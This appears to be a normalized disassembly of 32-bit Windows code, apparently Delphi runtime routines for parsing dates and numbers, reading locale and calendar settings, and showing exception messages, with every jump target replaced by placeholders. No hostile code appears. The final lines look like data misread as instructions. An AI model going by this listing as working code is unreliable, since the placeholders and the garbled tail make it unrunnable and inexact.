cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a8dc
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042f8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a994
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aa0d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa14
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a8dc
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042f8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404558
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40810c
test eax eax
jne r-xdata
mov eax edi
call sub_4042f8
add [ esi ] eax
mov bl 0x1
sub_40aa20
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a8dc
mov eax esi
call sub_4042f8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40aa58
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4042f8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40aaa4
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c600
mov [ ebx ] eax
jmp r-xdata
sub_40aaec
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4044f8
push eax
mov eax [ ebx ]
call sub_4044f8
pop edx
call sub_40c778
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ab40
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409ce0
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ab9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aeb7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40aa58
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c6b4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a900
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40aaa4
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404558
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_40817c
mov eax [ ebp - 0x1c ]
call sub_40aaec
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aebe
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40405c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa20
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a900
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa20
test al al
je r-xdata
call sub_409ce0
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a900
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a84
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40463c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa20
mov edx ebx
mov eax esi
call sub_40a8dc
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40aaa4
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ab40
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a8dc
mov eax esi
call sub_4042f8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409ce0
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4042f8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404558
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_40810c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4042f8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404558
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_40810c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aee0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a994
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a994
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a994
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a900
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8dc
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a994
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa20
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a900
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a994
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa20
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8dc
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_40997c
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a994
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a900
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a994
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa20
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a994
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a900
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b0d4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ab9c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b108
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aee0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b13c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ab9c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b108
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aee0
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b1c8
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404128
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b214
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40408c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404128
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b260
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b214
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405df8
sub_40b2c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b3d7
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b288
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40408c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b288
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40408c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b288
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40408c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b288
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40408c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3de
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40405c
retn
sub_40b3e8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b424
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b489
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4083f4
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b490
lea eax [ ebp - 0x4 ]
call sub_404038
retn
inc ebx
sub_40b49c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b533
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b214
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4083f4
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b53a
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b3e8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b424
call EnumCalendarInfoA
sub_40b54c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b716
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404038
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b214
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4083f4
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b71d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40405c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b80
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c5c4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404558
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404300
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408b80
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
inc ebx
jmp r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b80
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404220
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404300
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404220
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404300
sub_40b780
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b774
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c818
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408aa4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405330
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031f8
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4090dc
mov eax [ ebp - 0x4 ]
call sub_408a40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044f8
mov ebx eax
mov eax ebx
call sub_408a40
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b908
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b780
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405330
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b0c
call sub_402834
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408a40
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b9d0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40408c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40ba66
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_40911c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba6d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
add esp 0xfffffff0
call sub_40360c
sub_40ba6d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405df8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bb34
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405df8
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40911c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb3b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
add esp 0xfffffff0
call sub_40360c
sub_40bb3b
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40bb88
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028a8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bbe8
in al dx
mov ebx 0xa0e0040
push esp
inc ebp
js r-xdata
